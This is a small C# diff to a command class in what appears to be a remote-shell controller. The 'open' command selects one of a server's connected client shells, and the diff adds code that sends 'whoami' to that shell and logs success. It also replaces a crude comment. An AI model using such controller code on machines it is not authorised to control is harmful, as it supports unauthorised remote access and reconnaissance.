@@ -7,7 +7,9 @@ using Console = Colorful.Console;
 
 namespace Controller
 {
-    // all params are string because c# doesnt auto convert fuk
+    /// <summary>
+    /// Commands for the controller.
+    /// </summary>
     public class Commands
     {
         [Command(Help = "Sets current active shell to be controlled.\r\nUsage: open [index] Ex. open 0")]
@@ -17,6 +19,10 @@ namespace Controller
                 int _index = int.Parse(index);
 
                 Program.ActiveClient = Program.MainServer.Clients[_index];
+
+                Program.ActiveClient.WriteCMD("whoami");
+
+                Utils.Logging.Write(Utils.Logging.Type.Success, $"Active shell is now " + index);
             }
             catch (ArgumentOutOfRangeException ex)
             {
